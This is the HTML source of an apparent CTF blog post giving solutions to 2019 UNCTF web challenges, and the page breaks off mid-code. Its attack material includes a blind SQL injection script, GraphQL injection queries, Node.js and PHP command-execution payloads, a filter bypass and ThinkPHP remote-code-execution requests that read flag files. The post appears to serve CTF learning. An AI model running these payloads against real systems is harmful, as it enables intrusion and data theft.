@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      2019UNCTF WEB题解 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>2019UNCTF WEB题解</h2>
+  <p class="post-date">2019-11-02 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h1><p>利用update处存在盲注，修改密码后，注入布尔语句回显不一致</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1= string.printable</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regestr</span><span class="params">(username)</span>:</span></span><br><span class="line">    urlregester = <span class="string">"http://101.71.29.5:10002/login_create.php"</span></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">'username'</span>:username,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'re_password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    repregester = requests.post(urlregester,data=data1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Register</span><span class="params">(username)</span>:</span></span><br><span class="line">    urlregester = <span class="string">"http://101.71.29.5:10002/login_create.php"</span></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">'username'</span>:username,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'re_password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    repregester = rep.post(urlregester,data=data1)</span><br><span class="line">    sess=repregester.headers[<span class="string">'Set-Cookie'</span>][<span class="number">10</span>:<span class="number">36</span>]</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># first to register  new username id</span></span><br><span class="line">result=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        rep=requests.session()</span><br><span class="line">        a=random.randint(<span class="number">1</span>,<span class="number">9999999</span>)</span><br><span class="line">        username2 = <span class="string">f'c888<span class="subst">&#123;str(a)&#125;</span>'</span></span><br><span class="line">        <span class="comment">#print(username2)</span></span><br><span class="line">        regestr(username2)</span><br><span class="line">        <span class="comment">#username2 = f"oswor&#123;str(a)&#125;' &amp;&amp; ascii(substr((select group_concat(`1`) from (select 1 union select * from fl4g)redforce),&#123;j&#125;,1))=&#123;ord(i)&#125;#"</span></span><br><span class="line">        username2 = <span class="string">f"c888<span class="subst">&#123;str(a)&#125;</span>' &amp;&amp; ascii(substr((select e.1 from (select * from (select 1)a union select * from fl4g)e limit 1 offset 1),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;ord(i)&#125;</span>#"</span></span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>:Register(username2),</span><br><span class="line">            <span class="string">'Auth'</span>:<span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        urllogin=<span class="string">"http://101.71.29.5:10002/login.php"</span></span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">'login_user'</span>:username2,</span><br><span class="line">            <span class="string">'login_password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">            <span class="string">'mysubmit'</span>:<span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        urllogin = rep.post(url=urllogin,data=data2)</span><br><span class="line">        replogin = urllogin.text</span><br><span class="line">        print(username2)</span><br><span class="line">        <span class="comment">#print(cookies)</span></span><br><span class="line">        urlchange = <span class="string">"http://101.71.29.5:10002/pass_change.php"</span></span><br><span class="line">        data3= &#123;</span><br><span class="line">            <span class="string">"current_password"</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">'123456'</span>,</span><br><span class="line">            <span class="string">"re_password"</span>:<span class="string">'123456'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Reset'</span></span><br><span class="line">        &#125;</span><br><span class="line">        repchange= rep.post(urlchange,data=data3,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"successfully"</span> <span class="keyword">in</span> repchange.text:</span><br><span class="line">            result+=i</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</p>
+<p><img src="./1571658224467.png" alt="1571658224467"></p>
+<h1 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h1><p>原题</p>
+<p>参考链接：</p>
+<p><a href="https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0" target="_blank" rel="noopener">https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0</a></p>
+<p><a href="https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0" target="_blank" rel="noopener">https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0</a></p>
+<p>GophSql常用语句测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">mutation&#123;updateMemoInfo(mid:1,title:&quot;1&#39; or sleep(3)#&quot;)&#123;ok&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原因为类控制不完全，导致可以读到隐藏数据</p>
+<p>比赛链接:<a href="http://101.71.29.5:10012/" target="_blank" rel="noopener">http://101.71.29.5:10012</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">	allUsers&#123;</span><br><span class="line">    edges&#123;</span><br><span class="line">      node&#123;</span><br><span class="line">        id</span><br><span class="line">        username</span><br><span class="line">        memos&#123;</span><br><span class="line">          pageInfo&#123;</span><br><span class="line">            startCursor</span><br><span class="line">            endCursor</span><br><span class="line">          &#125;</span><br><span class="line">          edges&#123;</span><br><span class="line">            cursor</span><br><span class="line">            node&#123;</span><br><span class="line">              id</span><br><span class="line">              content</span><br><span class="line">              title</span><br><span class="line">              private</span><br><span class="line">              userId</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1571676027779.png" alt="1571676027779"></p>
+<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>找到交互的点，只有calc</p>
+<p>需要将空格替换掉，否则会爆undefined，使用了split分割e</p>
+<p><code>/calc require(&#39;child_process&#39;).execSync(&#39;cat${IFS}/flag&#39;).toString(&quot;utf8&quot;).trim()</code></p>
+<p><img src="./1571743400336.png" alt="1571743400336"></p>
+<p><img src="./1571742560376.png" alt="1571742560376"></p>
+<h1 id="审计一下世界上最好的语言吧"><a href="#审计一下世界上最好的语言吧" class="headerlink" title="审计一下世界上最好的语言吧"></a>审计一下世界上最好的语言吧</h1><p>匹配<code>&quot;/{if:(.*?)}(.*?){end if}/is&quot;</code></p>
+<p><img src="./1571821164683.png" alt="1571821164683"></p>
+<p>截取字符进行替换拼接</p>
+<p><img src="./1571821199927.png" alt="1571821199927"></p>
+<p>在看模板，可以看到<code>{haha:searchword}与{haha:searchnum}</code>是紧挨的状态，可以利用此处进行正则匹配</p>
+<p><img src="./1571821248927.png" alt="1571821248927"></p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.71.29.5:10003/?content=%3Csearch%3E&#123;i&#123;haha:type&#125;%3C/search%3E&amp;searchnum=&#123;end%20if&#125;&amp;type=f:phpinfo()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./1571820152303.png" alt="1571820152303"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10003/?content=&lt;search&gt;&#123;i&#123;haha:type&#125;.php')&#125;&lt;/search&gt;&amp;searchnum=&#123;end if&#125;&amp;type=f:readfile('flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1571821143763.png" alt="1571821143763"></p>
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>考点是利用正则匹配中 <code>\\</code> 匹配不到<code>\</code> ，这题刚放出来存在bug，由于<code>\\</code> 存在原因直接将<code>反引号</code>释放出来。直接利用反引号和通配符执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br><span class="line">        $a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br><span class="line">        $b = <span class="string">""</span>;</span><br><span class="line">        $b = <span class="string">'"'</span> . $b . <span class="string">'"'</span>;</span><br><span class="line">     $cmd = <span class="string">"file $a $b"</span>;</span><br><span class="line">     var_dump($cmd);</span><br><span class="line">      str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"$cmd"</span>); </span><br><span class="line">     system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&#96;&#x2F;bi?&#x2F;gr?p+-R+ctf&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="./1571918707614.png" alt="1571918707614"></p>
+<h2 id="题目修改后"><a href="#题目修改后" class="headerlink" title="题目修改后"></a>题目修改后</h2><p><code>\</code> 转义双引号，<code>%20#</code>为命令终止符号逃逸最后一个双引号执行命令的限制。</p>
+<p><img src="./1572001510478.png" alt="1572001510478"></p>
+<h1 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h1><ol>
+<li>利用tp生成的日志，信息泄露</li>
+</ol>
+<p><img src="./1572166521292.png" alt="1572166521292"></p>
+<ol start="2">
+<li>利用tp rce 读取waf.php</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 检测php标记和php函数 </span></span><br><span class="line"><span class="comment"> *   </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$into_safe = <span class="keyword">FALSE</span>; </span><br><span class="line">$safe_key_name = <span class="string">"safe_key"</span>; </span><br><span class="line">$safe_key = <span class="string">"easy_pentesnt_is_s0fun"</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_attack_keyword</span><span class="params">($str)</span></span>&#123; </span><br><span class="line">    $parrten_str = <span class="string">"/[&lt;?]\bphp\b|^&lt;[?]=.*$|^&lt;[?].*$|\bphpinfo\b|\bbase64_decode\b|\bfile_get_contents\b|\breadfile\b|\bfile\b|\bfopen\b|\bconvert_uuencode\b|^.*php:\/\/.*$/i"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($parrten_str,$str))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"this way is too easy!"</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//check safekey  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_safe_key</span><span class="params">($str_k,$str_v)</span></span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $safe_key_name,$safe_key; </span><br><span class="line">    <span class="keyword">if</span> ($str_k == $safe_key_name &amp;&amp; $str_v == $safe_key)&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//safe redirect </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_safe</span><span class="params">($safe_state)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>($safe_state)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script type='text/javascript'&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"window.location.href='/public/static/is_safe_page.html';"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/script&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script type='text/javascript'&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"window.location.href='/public/static/not_safe.html';"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/script&gt;"</span>; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $into_safe; </span><br><span class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123; </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(is_array($value))&#123; </span><br><span class="line">            <span class="keyword">foreach</span>($value <span class="keyword">as</span> $k =&gt; $v)&#123; </span><br><span class="line">                <span class="keyword">if</span>(check_safe_key($k,$v))&#123; </span><br><span class="line">                    $into_safe = <span class="keyword">TRUE</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                check_attack_keyword($v); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(check_safe_key($key,$value))&#123; </span><br><span class="line">                $into_safe = <span class="keyword">TRUE</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            check_attack_keyword($value); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">    is_safe($into_safe); </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123; </span><br><span class="line">        <span class="keyword">if</span>(is_array($value))&#123; </span><br><span class="line">            <span class="keyword">foreach</span>($value <span class="keyword">as</span> $k =&gt; $v)&#123; </span><br><span class="line">                check_attack_keyword($v); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            check_attack_keyword($value); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main(); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="getshell思路"><a href="#getshell思路" class="headerlink" title="getshell思路"></a>getshell思路</h2><p>参考文章：<a href="https://xz.aliyun.com/t/6106" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106</a></p>
+<p>php7 无法执行assert</p>
+<ol>
+<li><p>日志无法写入</p>
+</li>
+<li><p>禁用常见危险函数</p>
+</li>
+<li><p>&lt;?php  &lt;?  file被过滤</p>
+</li>
+<li><pre><code>/[&lt;?]\bphp\b|^&lt;[?]=.*$|^&lt;[?].*$|\bphpinfo\b|\bbase64_decode\b|\bfile_get_contents\b|\breadfile\b|\bfile\b|\bfopen\b|\bconvert_uuencode\b|^.*php:\/\/.*$/i
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用filter[] 多处理，这道题把&#96;Session::set&#96;给删了，写不了shell。但是依然生成PHPSESSID，在探测temp目录发现没有权限，其实就可以确定session文件写在这里面</span><br><span class="line"></span><br><span class="line">![1572070684595](.&#x2F;1572070684595.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找flag文件</span><br></pre></td></tr></table></figure>
+http://101.71.29.5:10021/public/index.php?safe_key=easy_pentesnt_is_s0fun&amp;s=capcha
+</code></pre></li>
+</ol>
+<p>_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=-1&amp;get[]=/home/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![1572070928246](.&#x2F;1572070928246.png)</span><br></pre></td></tr></table></figure>
+<p>/home/flag_1sh3r3.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读取可以用&#96;think\__include_file&#96; 也可以&#96;show_source&#96;</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;http</span><br><span class="line">http:&#x2F;&#x2F;101.71.29.5:10021&#x2F;public&#x2F;index.php?safe_key&#x3D;easy_pentesnt_is_s0fun&amp;s&#x3D;capcha</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;show_source&amp;server[]&#x3D;-1&amp;get[]&#x3D;&#x2F;home&#x2F;flag_1sh3r3.txt</span><br><span class="line"></span><br><span class="line"># flag&#123;9d35311fd3a12a9f81z6bfe4117e5540&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="./1572071033980.png" alt="1572071033980"></p>
+<h1 id="k-amp-k"><a href="#k-amp-k" class="headerlink" title="k&amp;k"></a>k&amp;k</h1><p>m参数消毒不完全，直接伪协议扒光所有代码。</p>
+<p>1.存在备份文件access.php.bak</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="./99.png" alt=""></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 